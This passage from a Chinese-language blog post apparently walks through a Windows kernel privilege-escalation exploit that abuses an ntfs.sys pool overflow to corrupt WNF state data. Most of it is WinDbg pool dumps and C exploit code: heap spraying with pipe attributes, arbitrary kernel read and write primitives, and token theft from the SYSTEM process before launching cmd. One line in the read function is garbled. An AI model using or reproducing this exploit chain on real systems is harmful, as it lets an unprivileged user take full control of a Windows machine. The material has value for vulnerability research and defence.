     ffffdd841d4b6250 size:   c0 previous size:    0  (Allocated)  Wnf  Process: ffff878ff44c80c0
     ffffdd841d4b6310 size:   c0 previous size:    0  (Allocated)  Wnf  Process: ffff878ff44c80c0
     ffffdd841d4b63d0 size:   c0 previous size:    0  (Allocated)  Wnf  Process: ffff878ff44c80c0
     ffffdd841d4b6490 size:   c0 previous size:    0  (Allocated)  Wnf  Process: ffff878ff44c80c0
     ffffdd841d4b6550 size:   c0 previous size:    0  (Allocated)  Wnf  Process: ffff878ff44c80c0
     ffffdd841d4b6610 size:   c0 previous size:    0  (Allocated)  Wnf  Process: ffff878ff44c80c0
     ffffdd841d4b66d0 size:   c0 previous size:    0  (Allocated)  Wnf  Process: ffff878ff44c80c0
    *ffffdd841d4b6790 size:   c0 previous size:    0  (Allocated) *NtFE
            Pooltag NtFE : Ea.c, Binary : ntfs.sys
     ffffdd841d4b6850 size:   c0 previous size:    0  (Allocated)  Wnf  Process: ffff878ff44c80c0
     ffffdd841d4b6910 size:   c0 previous size:    0  (Free)       ....
     ffffdd841d4b69d0 size:   c0 previous size:    0  (Allocated)  Wnf  Process: ffff878ff44c80c0
     ffffdd841d4b6a90 size:   c0 previous size:    0  (Allocated)  Wnf  Process: ffff878ff44c80c0
     ffffdd841d4b6b50 size:   c0 previous size:    0  (Allocated)  Wnf  Process: ffff878ff44c80c0
     ffffdd841d4b6c10 size:   c0 previous size:    0  (Allocated)  Wnf  Process: ffff878ff44c80c0
     ffffdd841d4b6cd0 size:   c0 previous size:    0  (Allocated)  Wnf  Process: ffff878ff44c80c0
     ffffdd841d4b6d90 size:   c0 previous size:    0  (Allocated)  Wnf  Process: ffff878ff44c80c0
     ffffdd841d4b6e50 size:   c0 previous size:    0  (Free)       ....
     ffffdd841d4b6f10 size:   c0 previous size:    0  (Free)       ....
被篡改过后的_WNF_STATE_DATA 数据结构
    1: kd> dd ffffdd841d4b6850
    ffffdd84`1d4b6850  030c0000 41414141 00000000 00000000  // 伪造的PoolHeader
    ffffdd84`1d4b6860  00000000 0000ffff 000003cc 00000000  // 伪造的_WNF_STATE_DATA，将用户数据长度改为了0x3cc
    ffffdd84`1d4b6870  61616161 61616161 61616161 61616161
    ffffdd84`1d4b6880  61616161 61616161 61616161 61616161
    ffffdd84`1d4b6890  61616161 61616161 61616161 61616161
    ffffdd84`1d4b68a0  61616161 61616161 61616161 61616161
    ffffdd84`1d4b68b0  61616161 61616161 61616161 61616161
    ffffdd84`1d4b68c0  61616161 61616161 61616161 61616161
接下来讲述如何将相对偏移读写转换为任意地址读写。
## 任意地址读
我们需要使用到另外一个数据结构PipeAttribution，和WNF类似，这个对象可以自定义大小。这里两个指针AttributeName、AttributeValue
正常情况下是指向PipeAttribute.data[]后面的，如果通过堆布局，将AttributeValue的指针该为任意地址，就可以实现任意地址读。遗憾的是，windows并没有提供直接更新该数据结构的功能，不能通过该方法进行任意地址写。
    struct PipeAttribute {
        LIST_ENTRY list;
        char * AttributeName;
        uint64_t AttributeValueSize ;
        char * AttributeValue ;
        char data [0];
    };
    typedef struct {
        HANDLE read;
        HANDLE write;
    } PIPES;
    // 初始化pipe
    void pipe_init(PIPES* pipes) {
        if (!CreatePipe(&pipes->read, &pipes->write, NULL, 0x1000)) {
            printf("createPipe fail\n");
            return 1;
        }
        return 0;
    }
    // 写入PipeAttribution
    int pipe_write_attr(PIPES* pipes, char* name, void* value, int total_size) {
        size_t length = strlen(name);
        memcpy(tmp_buffer, name, length + 1);
        memcpy(tmp_buffer + length + 1, value, total_size - length - 1);
        IO_STATUS_BLOCK  statusblock;
        char output[0x100];
        int mystatus = NtFsControlFile(pipes->write, NULL, NULL, NULL,
            &statusblock, 0x11003C, tmp_buffer, total_size,
            output, sizeof(output));
        if (!NT_SUCCESS(mystatus)) {
            printf("pipe_write_attr fail 0x%x\n", mystatus);
            return 1;
        }
        return 0;
    }
    // 读取PipeAttribution
    int pipe_read_attr(PIPES* pipes, char* name, char* output,int size) {
        IO_STATUS_BLOCK statusblock;
        int mystatus = NtFsControlFile(pipes->write, NULL, NULL, NULL,
            &statusblock, 0x110038, name,strlen(name)+1,
            output, size);
        if (!NT_SUCCESS(mystatus)) {
            printf("pipe_read_attr fail 0x%x\n", mystatus);
            return 1;
        }
        return 0;
    }
理想情况下的堆布局如下所示，ffffdd841d4b6850是之前被覆盖的_WNF_STATE_DATA对象，其余的chunk被释放，然后使用PipeAttribution对象堆喷重新占回。
    1: kd> !pool ffffdd841d4b6850
    Pool page ffffdd841d4b6850 region is Paged pool
     ffffdd841d4b6010 size:   c0 previous size:    0  (Free)       NpAt
     ffffdd841d4b60d0 size:   c0 previous size:    0  (Free)       NpAt
     ffffdd841d4b6190 size:   c0 previous size:    0  (Free)       NpAt
     ffffdd841d4b6250 size:   c0 previous size:    0  (Free)       NpAt
     ffffdd841d4b6310 size:   c0 previous size:    0  (Free)       NpAt
     ffffdd841d4b63d0 size:   c0 previous size:    0  (Free)       NpAt
     ffffdd841d4b6490 size:   c0 previous size:    0  (Free)       NpAt
     ffffdd841d4b6550 size:   c0 previous size:    0  (Free)       NpAt
     ffffdd841d4b6610 size:   c0 previous size:    0  (Free)       NpAt
     ffffdd841d4b66d0 size:   c0 previous size:    0  (Free)       NpAt
     ffffdd841d4b6790 size:   c0 previous size:    0  (Free)       NpAt
    *ffffdd841d4b6850 size:   c0 previous size:    0  (Allocated) *AAAA
            Owning component : Unknown (update pooltag.txt)
     ffffdd841d4b6910 size:   c0 previous size:    0  (Allocated)  NpAt  // 被攻击的数据结构
     ffffdd841d4b69d0 size:   c0 previous size:    0  (Free)       NpAt
     ffffdd841d4b6a90 size:   c0 previous size:    0  (Free)       NpAt
     ffffdd841d4b6b50 size:   c0 previous size:    0  (Free)       NpAt
     ffffdd841d4b6c10 size:   c0 previous size:    0  (Free)       NpAt
     ffffdd841d4b6cd0 size:   c0 previous size:    0  (Free)       NpAt
     ffffdd841d4b6d90 size:   c0 previous size:    0  (Free)       NpAt
     ffffdd841d4b6e50 size:   c0 previous size:    0  (Free)       NpAt
     ffffdd841d4b6f10 size:   c0 previous size:    0  (Free)       NpAt
    1: kd> dq ffffdd841d4b6910 
    ffffdd84`1d4b6910  7441704e`030c0000 00000000`00000000              // PoolHeader
    ffffdd84`1d4b6920  ffffdd84`1c8e6cb0 ffffdd84`1c8e6cb0              // list
    ffffdd84`1d4b6930  ffffdd84`1d4b6948 00000000`00000078              // AttributeName AttributeValueSize 
    ffffdd84`1d4b6940  ffffdd84`1d4b6950 00313330`315f6161              // AttributeValue
    ffffdd84`1d4b6950  61616161`00000407 61616161`61616161
    ffffdd84`1d4b6960  61616161`61616161 61616161`61616161
    ffffdd84`1d4b6970  61616161`61616161 61616161`61616161
    ffffdd84`1d4b6980  61616161`61616161 61616161`61616161
根据上面讲述的方法实现任意地址读函数
    int ab_read(void* addr, void* dst, int size) {
        WNF_CHANGE_STAMP stamp;
        char readData[0x400];
        ULONG readDataSize = sizeof(readData);
        NTSTATUS st;
        static char wtf_buf[0x1000];
        st = NtQueryWnfStateData(oobst, 0, 0, &stamp, readData, &readDataSize);
        if (!NT_SUCCESS(st)) {
            DEBUG("NtQueryWnfStateData fail %x\n", st);
            return 1;
        }
        PipeAttr* pa = (PipeAttr*)(readData + CHUNK_SIZE);
        pa->value = addr;
        if (size value_len = 0x100;
        else
            pa->value_len = size;
        st = NtUpdateWnfStateData(oobst, readData, readDataSize, 0, 0, 0, 0);
        if (!NT_SUCCESS(st)) {
            DEBUG("NtQueryWnfStateData fail %x\n", st);
            return 1;
        }
        if (pipe_read_attr(&pipes, attackName, wtf_buf, sizeof(wtf_buf))) {
            return 1;
        }
        memcpy(dst, wtf_buf, size);
        return 0;
    }
## 任意地址写
我通过修改_WNF_NAME_INSTANCE结构体内的指针_WNF_STATE_DATA实现任意地址写。具体操作是再次释放掉原来的PipeAttribution，使用_WNF_NAME_INSTANCE重新进行堆喷，布局好的堆如下所示
    1: kd> !pool ffffdd841d4b6850
    Pool page ffffdd841d4b6850 region is Paged pool
     ffffdd841d4b6010 size:   c0 previous size:    0  (Allocated)  Wnf  Process: ffff878ff44c80c0
     ffffdd841d4b60d0 size:   c0 previous size:    0  (Allocated)  Wnf  Process: ffff878ff44c80c0
     ffffdd841d4b6190 size:   c0 previous size:    0  (Allocated)  Wnf  Process: ffff878ff44c80c0
     ffffdd841d4b6250 size:   c0 previous size:    0  (Allocated)  Wnf  Process: ffff878ff44c80c0
     ffffdd841d4b6310 size:   c0 previous size:    0  (Allocated)  Wnf  Process: ffff878ff44c80c0
     ffffdd841d4b63d0 size:   c0 previous size:    0  (Allocated)  Wnf  Process: ffff878ff44c80c0
     ffffdd841d4b6490 size:   c0 previous size:    0  (Allocated)  Wnf  Process: ffff878ff44c80c0
     ffffdd841d4b6550 size:   c0 previous size:    0  (Allocated)  Wnf  Process: ffff878ff44c80c0
     ffffdd841d4b6610 size:   c0 previous size:    0  (Allocated)  Wnf  Process: ffff878ff44c80c0
     ffffdd841d4b66d0 size:   c0 previous size:    0  (Allocated)  Wnf  Process: ffff878ff44c80c0
     ffffdd841d4b6790 size:   c0 previous size:    0  (Allocated)  Wnf  Process: ffff878ff44c80c0
    *ffffdd841d4b6850 size:   c0 previous size:    0  (Allocated) *AAAA
            Owning component : Unknown (update pooltag.txt)
     ffffdd841d4b6910 size:   c0 previous size:    0  (Allocated)  NpAt
     ffffdd841d4b69d0 size:   c0 previous size:    0  (Allocated)  Wnf  Process: ffff878ff44c80c0 // 被修改_WNF_STATE_DATA指针的WNF对象
     ffffdd841d4b6a90 size:   c0 previous size:    0  (Allocated)  Wnf  Process: ffff878ff44c80c0
     ffffdd841d4b6b50 size:   c0 previous size:    0  (Allocated)  Wnf  Process: ffff878ff44c80c0
     ffffdd841d4b6c10 size:   c0 previous size:    0  (Allocated)  Wnf  Process: ffff878ff44c80c0
     ffffdd841d4b6cd0 size:   c0 previous size:    0  (Allocated)  Wnf  Process: ffff878ff44c80c0
     ffffdd841d4b6d90 size:   c0 previous size:    0  (Allocated)  Wnf  Process: ffff878ff44c80c0
     ffffdd841d4b6e50 size:   c0 previous size:    0  (Allocated)  Wnf  Process: ffff878ff44c80c0
     ffffdd841d4b6f10 size:   c0 previous size:    0  (Allocated)  Wnf  Process: ffff878ff44c80c0
通过局部地址读写，覆盖掉下一个Wnf结构体（ffffdd841d4b69d0
）里的_WNF_STATE_DATA，使用对应的结构体进行NtUpdateWnfStateData操作，即可实现任意地址写。
## Windows权限提升
windows权限提升的方法一般都是遍历进程链表，找到高权限进程的token（8字节），替换当前进程的token。
    // 循环遍历进程链表，搜索process_id为4的进程，读取其token
      ULONGLONG token_addr = eprocess + token_offset;
        UCHAR* begin_eprocess = eprocess;
        while (1) {
            ULONGLONG process_id;
            ab_read(eprocess + process_id_offset, &process_id, 8);
            if (process_id == 4) {
                break;
            }
            UCHAR* tmp;
            ab_read(eprocess + link_offset, &tmp, 8);
            tmp -= link_offset;
            if (tmp == begin_eprocess) {
                break;
            }
            eprocess = tmp;
        }
        ULONGLONG token;
        ab_read(eprocess + token_offset,&token, 8);
        DEBUG("system token %016llx\n", token);
最后执行cmd。
## 总结
该漏洞的触发条件并不复杂，利用过程也比较简单，虽然windows的堆分配已经有了很大的随机化，但是大力出奇迹，很容易能够得到理想的堆布局，本地实验过程中的exp基本很少将系统打崩溃。写exp的主要时间是在学习windows系统调用如何传参，查阅了很多文档才搞清楚WNF的用法。总体来说难度不大，非常适合初学者入门。
* * *